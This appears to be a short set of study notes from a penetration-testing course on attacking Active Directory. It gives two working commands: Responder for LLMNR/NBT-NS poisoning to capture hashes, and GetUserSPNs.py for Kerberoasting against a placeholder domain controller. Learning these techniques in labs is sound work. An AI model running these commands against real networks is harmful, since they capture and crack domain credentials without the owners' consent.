---
layout: default
title: Active Directory Enumeration
---

# Active Directory Enumeration & Attacks

Notes compiled during the HTB CPTS pathway mapping enterprise domain environments.

## 0x01. Initial LLMNR/NBT-NS Poisoning
Use Responder to capture initial hashes on the network interface:
```bash
sudo responder -I eth0 -rdw
```

## 0x02. Domain Kerberoasting
Execute tool mappings to sweep for SPN accounts:
```bash
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/user:password -request
```
